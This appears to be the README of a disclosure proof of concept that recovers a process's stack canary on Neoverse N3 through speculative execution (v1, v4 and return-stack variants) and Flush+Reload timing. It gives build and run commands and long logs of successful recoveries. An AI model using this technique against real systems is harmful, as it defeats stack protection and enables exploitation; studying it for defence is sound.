# Stack-canary recovery on Neoverse N3 - a speculative canonicality oracle, three channels

This proof-of-concept recovers a process's **stack-protector canary** bit by bit through a speculative
address-canonicality oracle. Each bit is decided by whether a speculative access allocates a cache line. The
same 2-D array gadget is driven by three interchangeable speculation primitives (`v1`, `v4`, `rsb`); the
read-out is Flush+Reload, timed with the L1D-refill PMU counter. The program runs unprivileged, and the
out-of-bounds access forms only on the speculative path.

**Scope.** The recovery is blind: every bit is decided by a cache-residency measurement, and the offset that
isolates each bit is built only from the bits already recovered (all at higher positions), carried forward as
the cascade descends. The known canary is consulted for exactly two things - to map the finite set of
candidate pages up front (standing in for the assumption that the whole user address space is mapped; see
*Disclaimer*), and to score the result. Because each bit's offset carries the recovered bits forward, one
mis-read bit makes the bits below it collapse; the program detects that collapse, reports a failed attempt,
and retries.

The canary is 64 bits. Its low byte `[7:0]` is glibc's `0x00` terminator (known); its top byte `[63:56]`
is ignored by the top-byte-ignore (TBI) feature and is outside the reach of an address-canonicality oracle.
The recoverable range is therefore `[55:0]`, and that is what the PoC recovers.

## The gadget - a two-dimensional array dereference

Every channel runs the classic Spectre-v1 shape

```c
rows[i][sizes[i] - 1]
```

with two roles reversed from a textbook example: an out-of-bounds index `i` reads the canary out of the
local `sizes[]` array (so the canary is the **inner index**), while `rows[i]` is an attacker-controlled base
pointer. Only the mispredicted path forms the address `rows[i] + canary - 1`; architecturally the access
stays within bounds and the victim runs cleanly.

**What each channel does, from the victim's point of view.** In all three the victim's code is ordinary and
safe; the leak is the core *speculatively* running the guarded access on the wrong path.

- **`v1` - a bounds-checked array access.** The victim runs `if (index < length) use(array[index])`. The
  length is uncached, so the check resolves slowly. The attacker has called the code many times with
  in-bounds indices, training the predictor to expect the check to pass; a later call with the
  out-of-bounds canary index is then mispredicted "in bounds", and the access runs speculatively.
- **`v4` - a bound written then read.** The victim sets a `length`, then does `if (i < length) use(array[i])`.
  When the store that sets `length` takes its address from data that resolves late, the later load of
  `length` bypasses the store and reads the stale, larger value, so the access runs speculatively under a
  bound that has architecturally already been lowered.
- **`rsb` - a function return.** The victim returns from a call and the caller continues. When the return
  address is slow to load from memory, the core predicts the return target from its return-stack (the
  instruction after the matching call) and speculatively runs the access that sits there.

On `v1` and `v4` both the out-of-bounds read of the canary *and* the transmit are speculative. On `rsb` the
read of `sizes[i]` runs architecturally (plain C before the inline asm); only the transmit - the dereference
that reveals the bit - is speculative. For a self-canary the distinction is immaterial: a process may read
its own stack.

## Initialization - mapping the pages the algorithm will probe

Before any measurement, the program performs a one-time setup:

1. **Read the canary** of the current process (it is the same value in every frame).
2. **Map the pages the recovery can reference.** Mapping the whole address space is infeasible, so instead
   the program maps exactly the finite set of pages the algorithm's speculative probe can land on: the
   canonical page `canary & MASK48`, and, for each recoverable bit `c_i` (`i = 16..51`), one scaffold page

   ```
   S_i = [63:48]=0 | [47:63-i]=1 | [62-i:12]=(lower canary bits) | [11:0]=0
   ```

   A run of set canary bits makes consecutive scaffold pages coincide; those duplicates are expected. Any
   scaffold page that would collide with an existing mapping (stack, libraries) is reported and stops the
   run.

A pure-arithmetic self-check confirms, before touching hardware, that the offsets recover every bit; a
mismatch aborts.

## The oracle and the three phases

On N3 a speculative access to a **non-canonical** address is fast-rejected and the watched line stays cold; a
canonical, mapped address allocates it and can be observed. The recovery uses this in three phases, each
resolving a disjoint part of the canary:

- **Phase A - bits `[55:48]`.** Sweep an additive constant over the top address byte. Exactly one guess
  rolls `[55:48]` to zero (its carry absorbed by the TBI top byte), landing the probe on the canonical page;
  that guess is the byte.
- **Phase B - bits `[47:12]`, by carry propagation (top-down cascade).** Bits are recovered from the top
  down, and the offset that tests `c_i` is built from the bits already recovered above it. When `c_i == 0`
  the probe lands on the mapped scaffold page `S_i` and it allocates; when `c_i == 1` an all-ones run ripples
  a carry into bit 48, pushing the address out of range so it is fast-rejected and the scaffold line stays
  cold. Residency of `S_i` reveals `c_i`, and each recovered bit feeds the next offset. A mis-read bit makes
  every lower bit collapse to a dark run, which the driver detects to fail and retry the attempt.
- **Phase C - bits `[11:6]`.** Within the winning page the probe lands on one 64-byte line; the resident
  line reveals these bits at Flush+Reload granularity. Bits `[5:0]` are below a cache line and belong to the
  known zero byte.

## Disclaimer

This proof-of-concept isolates the channel rather than packaging a full exploit. It relies on a few
assumptions: that the pages the algorithm probes are mapped in userspace (see *Initialization*); that
residency is timed with the PMU L1D-refill counter; that the read-out is Flush+Reload; and, for the `v1`
channel, that the bounds-check branch is mistrained with in-bounds indices. These
assumptions serve **noise reduction**; other proofs-of-concept in this disclosure establish practicality
directly - Prime+Probe, rootless `cntvct_el0` timing, and cross-boundary reach. The point is that, with some
creativity, this channel reaches further than one might expect: a process's own stack canary, recovered
through three interchangeable speculation primitives.

Because Flush+Reload reloads a mapped address, the watched page and line are positioned from the canary, and
this PoC takes that positioning as known. A self-contained variant would recover the cache set with
Prime+Probe - phase A already shows which set the canonical access disturbs - and enumerate the candidate
high bits for the canonicality test rather than mapping a scaffold from the value; that is out of scope here.

A fully-mapped user address space is a lab assumption, and the mapped scaffold stands in for it here. That
gap should not be mistaken for a mitigation: address translation manages memory - it is **not a
confidentiality boundary**, and should not be treated as one. That a speculative target usually lands on an
unmapped page is an artifact of allocation, and a defense should not rest on it.

## Read-out

The default read-out is **Flush+Reload** timed with the PMU `L1D_REFILL` event (needs `../common/raw_pmu.ko`).
The same channel is observable with **Prime+Probe** and with a **rootless** `cntvct_el0` timer; Flush+Reload
with a hardware counter is chosen here only because it is the quietest. Phase A can, in principle, recover
the high byte and the evicted canonical line simultaneously - the winning guess both fixes `[55:48]` and
tells which cache set the canonical access disturbed - which is what a Prime+Probe read-out would use to pin
the set to monitor.

## Build and run

```
gcc -O2 -march=armv8.3-a -mbranch-protection=pac-ret+leaf -fstack-protector-strong -Wall \
    canary_leak_blind.c -o canary_leak_blind
sudo insmod ../common/raw_pmu.ko            # EL0 PMU read-out (the only privileged dependency)
taskset -c 90 ./canary_leak_blind -w all -c 90
```

`-fstack-protector-strong` is required so a canary exists to read. Pin to an isolated core. The one
privileged dependency is the PMU read-out kernel module (`../common/raw_pmu.ko`); building it
needs the matching kernel headers installed (`apt install linux-headers-$(uname -r)`).

```
-w v1|v4|rsb|all   channel(s) to run                 (default: all)
-c cpu             pin to this CPU                    (default: current)
-r rounds          measurement rounds per bit         (default: per-channel)
-k                 control: neuter the probe (expect no recovery)
-v                 per-bit detail
```

## Expected output

Each accepted attempt prints the recovered `[55:0]` (top byte shown `??`, TBI-blind), the true canary (used
only to score), the matched-bit count, and which attempt succeeded:

```
[v4 ] recovered ??0af049e063d900   true 4e0af049e063d900   [55:0] 56/56   FULL (attempt 1)
```

Measured on one isolated Neoverse N3 core, 20 launches per channel (`-w <ch> -c 90`), a fresh random canary
each launch:

```
=================  channel: v4  (20 runs)  =================
[v4 ] recovered ??0af049e063d900   true 4e0af049e063d900   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??c60cb2797ef800   true 06c60cb2797ef800   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??202df3da4fb000   true c1202df3da4fb000   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??77d5dfdf627000   true a177d5dfdf627000   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??f3b97324d69100   true aaf3b97324d69100   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??ea2b1963adee00   true 91ea2b1963adee00   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??a18e647b4a6400   true 0ba18e647b4a6400   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??81df5def00cc00   true 4781df5def00cc00   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??60e35a1c36dc00   true 2160e35a1c36dc00   [55:0] 56/56   FULL (attempt 1)
[v4 ] no retrieval: channel did not fire
[v4 ] recovered ??7553e2f03d9700   true e67553e2f03d9700   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??2ca8f1b17d8a00   true 212ca8f1b17d8a00   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??73f634c90d2900   true 6273f634c90d2900   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??3b406ae4fd6300   true 233b406ae4fd6300   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??51dc6ce33a3d00   true e051dc6ce33a3d00   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??ff735938519900   true 8fff735938519900   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??80aa16e7ed6f00   true 8680aa16e7ed6f00   [55:0] 56/56   FULL (attempt 1)
[v4 ] recovered ??c56df0b07eee00   true f6c56df0b07eee00   [55:0] 56/56   FULL (attempt 1)
[v4 ] no clean retrieval in 12 attempts
[v4 ] recovered ??2bca0e21c3c200   true 342bca0e21c3c200   [55:0] 56/56   FULL (attempt 1)
  v4:  full [55:0] recovery = 18/20   (both misses reported a mis-fire, not a value)

=================  channel: rsb  (20 runs)  =================
[rsb] recovered ??10874bab397000   true c710874bab397000   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??4d877befa50b00   true 634d877befa50b00   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??d771a656152b00   true 04d771a656152b00   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??9c3e8bc0308600   true cf9c3e8bc0308600   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??57d28d47551500   true e257d28d47551500   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??88128deb683800   true ef88128deb683800   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??c2aed378c81600   true d1c2aed378c81600   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??6398ea63664200   true ef6398ea63664200   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??c9b9c28df44700   true 86c9b9c28df44700   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??5773646c524000   true 895773646c524000   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??c12597eca63800   true 1fc12597eca63800   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??47d0e627915300   true c147d0e627915300   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??698e885674c900   true 88698e885674c900   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??30d9e5e94e1700   true 9b30d9e5e94e1700   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??736c2ce172b500   true cf736c2ce172b500   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??605fc0546c4000   true dc605fc0546c4000   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??67a0f6f4d86b00   true b767a0f6f4d86b00   [55:0] 56/56   FULL (attempt 1)
[rsb] no clean retrieval in 12 attempts
[rsb] recovered ??235ae360615700   true 85235ae360615700   [55:0] 56/56   FULL (attempt 1)
[rsb] recovered ??c3bfb6a9366700   true 04c3bfb6a9366700   [55:0] 56/56   FULL (attempt 1)
  rsb: full [55:0] recovery = 19/20   (one launch reports a mis-fire)

=================  channel: v1  (20 runs)  =================
[v1 ] recovered ??3ed831a3a5a700   true 143ed831a3a5a700   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??e4134087688300   true 71e4134087688300   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??997b978d755900   true 44997b978d755900   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??2f94dd37fc4100   true 442f94dd37fc4100   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??43f28d51a2fe00   true cb43f28d51a2fe00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??dc447be558a000   true 07dc447be558a000   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??bfec484cc59400   true 9bbfec484cc59400   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??96c3888531e000   true e496c3888531e000   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??f181abea256400   true f9f181abea256400   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??33afc96842ff00   true 3533afc96842ff00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??fb394d3f2b8400   true ebfb394d3f2b8400   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??fd0cf1e8514200   true 68fd0cf1e8514200   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??cd4424401b3d00   true b9cd4424401b3d00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??95c6afbcf1db00   true 0495c6afbcf1db00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??27e97b8e2b9a00   true a027e97b8e2b9a00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??120af0dea55100   true 98120af0dea55100   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??c4685c754aa200   true 0bc4685c754aa200   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??ad69dd999ebf00   true fbad69dd999ebf00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??e59dc321fcfa00   true 76e59dc321fcfa00   [55:0] 56/56   FULL (attempt 1)
[v1 ] recovered ??dd9e3bb20ef800   true 01dd9e3bb20ef800   [55:0] 56/56   FULL (attempt 1)
  v1:  full [55:0] recovery = 20/20

=================  control (-k), all channels  =================
[v4 ] control   ??00fffffffff000   true 357075857cf3e900   [55:0] 37/56   no leak (probe neutered)
[rsb] control   ??00fffffffff000   true 452f4105c3b2aa00   [55:0] 27/56   no leak (probe neutered)
[v1 ] control   ??00fffffffff000   true 36b721a1d7c79f00   [55:0] 28/56   no leak (probe neutered)
```

All three channels recover the complete canary on the first attempt on nearly every launch. A launch whose
speculation window does not open reports `no clean retrieval` or `channel did not fire` rather than a value,
and a mis-fired attempt is announced as `attempt N failed, retrying` and retried. The collapse check turns
a mis-fire into a reported failure rather than a value in nearly all cases, though a rare low-bit near-miss
can still print as a scored `partial`. Under `-k` the probe reads a fixed safe page, so every channel
returns the fixed `00fffffffff000` pattern, which coincides with a random canary in about 32/56 bits by chance.
